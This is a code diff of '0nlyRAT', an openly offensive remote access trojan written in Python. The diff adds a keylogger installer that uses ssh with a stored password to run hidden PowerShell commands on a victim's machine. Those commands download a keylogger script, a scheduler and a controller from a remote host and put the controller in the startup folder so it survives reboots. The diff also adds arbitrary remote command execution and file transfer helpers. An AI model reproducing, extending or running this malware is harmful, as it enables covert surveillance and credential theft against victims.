@@ -28,22 +28,21 @@ banner = r"""
 help_menu = """
             [::] 0nlyRAT help menu [::]
 
-            [+] Arguments:            
-                                                   ____                                                               ____  
-                                                  |                                                                       |
-                                                  |  place the config file name with extension returned from the target   |
-                python3 main.py <config file>   = |                                                                       |
-                                                  |  File must have .rat extension                                        |
-                                                  |____                                                               ____|
+            [+] Arguments:                                   
+                [*] <config file> with extension (.rat)
+                [*] -h or --help    for help
+                [*] -u or --update  for update
+                [*] -r or --remove  for uninstall
             
 """
 
 options_menu = """
             [+] command and control:
                 [0] Remote Console
-                [1] Keylogger
-                [2] remote download
-                [3] remote upload
+                [1] Keylogger       (not done yet)
+                [2] remote download (not done yet) 
+                [3] remote upload   (not done yet) 
+                [4] remote command  (not done yet)
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -62,7 +61,7 @@ local_path = f"/home/{username}/.0nlyRAT" if username!="root" else "/root/.0nlyR
 
 IP_KEY = "IPADDRESS"
 PASS_KEY = "PASSWORD"
-WORKINGDIR_KEY = "WORKINGDIR"
+TEMPDIR_KEY = "TEMPDIR"
 STARTUPDIR_KEY = "STARTUPDIR"
 
 def read_config(config_file):
@@ -72,13 +71,13 @@ def read_config(config_file):
     read_lines = open(config_file, "r").readlines()
     configuration[IP_KEY] = read_lines[0].strip()
     configuration[PASS_KEY] = read_lines[1].strip()
-    configuration[WORKINGDIR_KEY] = read_lines[2].replace("\\","/").strip()
+    configuration[TEMPDIR_KEY] = read_lines[2].replace("\\","/").strip()
     configuration[STARTUPDIR_KEY] = read_lines[3].replace("\\","/").strip()
     return configuration
 
-# remotely connect RAT to target
-def connect(tgt_ipv4,tgt_pword):
-    os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")
+# remotely connect to target
+def connect(ipv4,pword):
+    os.system(f"sshpass -p \"{pword}\" ssh onlyrat@{ipv4}")
 
 def exit():
     print("[*] exiting...")
@@ -96,11 +95,30 @@ def os_detection():
 def random_text():
     return ''.join(s.choice(string.ascii_letters+string.digits) for _ in range(r.randint(8,17)))
 
+# scp upload
 def remote_upload(ipv4,pword,file_path,upload_path):
     os.system(f"sshpass -p \"{pword}\" scp {file_path} onlyrat@{ipv4}:{upload_path}")
 
+# scp download
 def remote_download(ipv4,pword,path_to_file,local_download_location):
     os.system(f"sshpass -p \"{pword}\" scp onlyrat@{ipv4}:{path_to_file} {local_download_location}")
+
+def remote_command(ipv4,pword,command):
+    os.system(f"sshpass -p \"{pword}\" ssh onlyrat@{ipv4} '{command}'")
+
+def keylogger(ipv4,pword,temp_path,startup_path):
+    print("[+] Initializing keylogger....")
+    keylogger_command = f"powershell powershell.exe -ep bypass -w hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile '{temp_path}/XukhovfGQPLEcYwZ.ps1'\""
+    scheduler_command = f"powershell powershell.exe -ep bypass -w hidden -c \"iwr -uri {remote_path}/keylogger/scheduler.ps1 -outfile '{temp_path}/QbaHnRAlojyG.ps1'\""
+    controller_command = f"powershell powershell.exe -ep bypass -w hidden -c \"iwr -uri {remote_path}/keylogger/controller.cmd -outfile '{startup_path}/WPNtcsvEaf.cmd'\""
+    print("[+] keylogger prepared. Ready to download....")
+    print("[+] Initializing keylogger.....")
+    remote_command(ipv4,pword,keylogger_command)
+    print("[+] Initializing scheduler.....")
+    remote_command(ipv4,pword,scheduler_command)
+    print("[+] Initializing  controller.....")
+    remote_command(ipv4,pword,controller_command)
+    print("[*] keylogger installed successfully")
 
 def update():
     return
@@ -118,11 +136,11 @@ def cli(arguments):
             try:
                 configuration = read_config(argument)
             except FileNotFoundError:
-                print(f"Error: Config file '{argument}' does not exist.")
+                print(f"\nError: Config file '{argument}' does not exist.\n")
                 exit()
             tgt_ipv4 = configuration.get(IP_KEY)
             tgt_pword = configuration.get(PASS_KEY)
-            tgt_wd = configuration.get(WORKINGDIR_KEY)
+            tgt_td = configuration.get(TEMPDIR_KEY)
             tgt_sd = configuration.get(STARTUPDIR_KEY)
             print(options_menu)
             print("\t    [*] type \"help\" for help menu [*]\n")
@@ -131,13 +149,7 @@ def cli(arguments):
                 if option == "0":
                     connect(tgt_ipv4,tgt_pword)
                 elif option == "1":
-                    controller = f"{local_path}/payloads/keylogger/controller.cmd"
-                    keylogger = f"{local_path}/payloads/keylogger/keylogger.ps1"
-                    scheduler = f"{local_path}/payloads/keylogger/scheduler.ps1"
-
-                    remote_upload(tgt_ipv4,tgt_pword,controller,upload_path) #controller
-                    remote_upload(tgt_ipv4,tgt_pword,keylogger,upload_path) #keylogger
-                    remote_upload(tgt_ipv4,tgt_pword,scheduler,upload_path) #scheduler
+                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "help":
                     clear()
                     print(banner)
